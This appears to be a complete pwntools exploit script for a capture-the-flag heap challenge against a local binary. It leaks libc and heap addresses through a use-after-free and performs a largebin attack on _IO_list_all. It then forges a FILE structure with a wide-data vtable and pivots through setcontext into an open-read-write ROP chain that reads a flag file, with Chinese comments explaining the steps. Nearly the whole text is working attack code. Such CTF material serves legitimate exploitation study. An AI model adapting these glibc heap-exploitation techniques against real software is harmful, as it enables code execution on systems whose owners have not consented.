from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=process("./vuln")
libc=ELF("./libc.so.6")

def add(n,s):
    io.sendlineafter(b">",b"1")
    io.sendlineafter(b"Index: ",str(n))
    io.sendlineafter(b"Size: ",str(s))

def delete(n):
    io.sendlineafter(b">",b"2")
    io.sendlineafter(b"Index: ",str(n))

def edit(n,cc):
    io.sendlineafter(b">",b"3")
    io.sendlineafter(b"Index: ",str(n))
    io.sendafter(b"Content: ",cc)

def show(n):
    io.sendlineafter(b">",b"4")
    io.sendlineafter(b"Index: ",str(n))
    
def exit():
    io.sendlineafter(b">",b"5")

def build_fake_file(addr, vtable, _wide_data, rdx=0):
    # fake_file = p64(flag)  # _flags
    # fake_file += p64(addr)  # _IO_read_ptr
    fake_file = b""
    fake_file += p64(addr)  # _IO_read_end
    fake_file += p64(addr)  # _IO_read_base
    fake_file += p64(addr)  # _IO_write_base
    fake_file += p64(addr + 1)  # _IO_write_ptr
    fake_file += p64(rdx)  # _IO_write_end
    fake_file += p64(addr)  # _IO_buf_base
    fake_file += p64(0)  # _IO_buf_end
    fake_file += p64(0)  # _IO_save_base
    fake_file += p64(0)  # _IO_backup_base
    fake_file += p64(0)  # _IO_save_end
    fake_file += p64(0)  # _markers
    fake_file += p64(0)  # _chain   could be a anathor file struct
    fake_file += p32(1)  # _fileno
    fake_file += p32(0)  # _flags2
    fake_file += p64(0)  # _old_offset
    fake_file += p16(0)  # _cur_column
    fake_file += p8(0)  # _vtable_offset
    fake_file += p8(0x10)  # _shortbuf
    fake_file += p32(0)
    fake_file += p64(0)  # _lock
    fake_file += p64(0)  # _offset
    fake_file += p64(0)  # _codecvt
    fake_file += p64(_wide_data)  # _wide_data
    fake_file += p64(0)  # _freeres_list
    fake_file += p64(0)  # _freeres_buf
    fake_file += p64(0)  # __pad5
    fake_file += p32(0)  # _mode
    fake_file += p32(0)  # unused2
    fake_file += p64(0) * 2  # unused2
    fake_file += p64(vtable)  # vtable
    return fake_file


add(0,0x608) #fake_wide_data
add(1,0x550) #fake_chain 可控大堆块
add(2,0x600)
add(3,0x540) #小堆块
add(4,0x600)


### leak libc_addr
delete(1)
show(1)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x1f6cc0
tmp=leak_addr+0x1f6cc0+0x4b0
print("leak_addr: "+hex(leak_addr))
###

pop_rdi=leak_addr+0x23ba5
pop_rsi=leak_addr+0x251fe
pop_rdx_rbx=leak_addr+0x8bbb9
pop_rax=leak_addr+0x3f923
ret=leak_addr+0x22d19
_IO_list_all=leak_addr+libc.sym[b"_IO_list_all"]
_IO_wfile_jumps=leak_addr+libc.sym[b"_IO_wfile_jumps"]
setcontext_61=leak_addr+libc.sym[b"setcontext"]+0x3d
open_a=leak_addr+libc.sym[b"open"]
read_a=leak_addr+libc.sym[b"read"]
write_a=leak_addr+libc.sym[b"write"]
magic_gadget=leak_addr+0x160cb6
'''
mov rdx, qword ptr [rax + 0x38];
mov rdi, rax; 
call qword ptr [rdx + 0x20];
'''


### leak heap_addr 
add(5,0x900) #fake_jump 0x1f70
edit(1,b"a"*0xf+b"b")
show(1)
io.recvuntil(b"b")
heap_addr=u64(io.recv(6).ljust(8,b"\x00"))-0x8a0
print("heap_addr: "+hex(heap_addr))


### largebin attack
delete(3)
edit(1,p64(tmp)*2+p64(0)+p64(_IO_list_all-0x20))
add(6,0x900)
###
add(7,0x540) #将小堆块申请出来，进行unlink，使得_IO_list_all_chain的地址是可控的大堆块的地址，否则伪造fake_file地址非法


# 对fp的设置如下：
# _flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为sh;，注意前面有两个空格
# vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可
# _wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
# _wide_data->_IO_write_base设置为0，即满足*(A + 0x18) = 0
# _wide_data->_IO_buf_base设置为0，即满足*(A + 0x30) = 0
# _wide_data->_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
# _wide_data->_wide_vtable->doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C


#edit _flags ~(2 | 0x8 | 0x800)
# edit(0,b"\x00"*0x600+p64((~(2 | 0x8 | 0x800))&0xffffffffffffffff))

#fake_wide_data
fake_wide_data=heap_addr+0x2a0
flag_addr=heap_addr+0x2a0

edit(1,build_fake_file(0,_IO_wfile_jumps,fake_wide_data,0))
fake_jump=heap_addr+0x1f70


_wide_data=b"./flag\x00\x00"
_wide_data=_wide_data.ljust(0x18,b"\x00")+p64(0)
_wide_data=_wide_data.ljust(0x30,b"\x00")+p64(0)
_wide_data=_wide_data.ljust(0xe0,b"\x00")+p64(fake_jump)
edit(0,_wide_data)


# gdb.attach(io)
# pause()


#open
orw=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x4000)+p64(pop_rdx_rbx)+p64(0x50)+p64(0)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x4000)+p64(pop_rdx_rbx)+p64(0x50)+p64(0)+p64(write_a)

payload=p64(setcontext_61)+p64(fake_jump-0x10)*10+p64(magic_gadget) #C -> magic_gadget
payload+=b"\x00"*0x20+p64(heap_addr+0x2010) #orw_addr
payload+=p64(ret)+orw
#这一坨之所以行，首先fake_wide_data设置的fake_jump+0x68跳转执行magic_gadget
#当我们edit时，其中的read函数将读入的数据地址存到rax寄存器中了，则rdx寄存器的值变为[rax+0x38]，即fake_jump-0x10处
#此时call qword ptr [rdx + 0x20]其实调用的是setcontext+61,并且此时rsp值为[rdx+0xa0]，即heap_addr+0x1d10
#heap_addr+0x1d10的地址即为orw的地址，ret等效pop rip，从而执行orw


edit(5,payload)
exit()

io.interactive()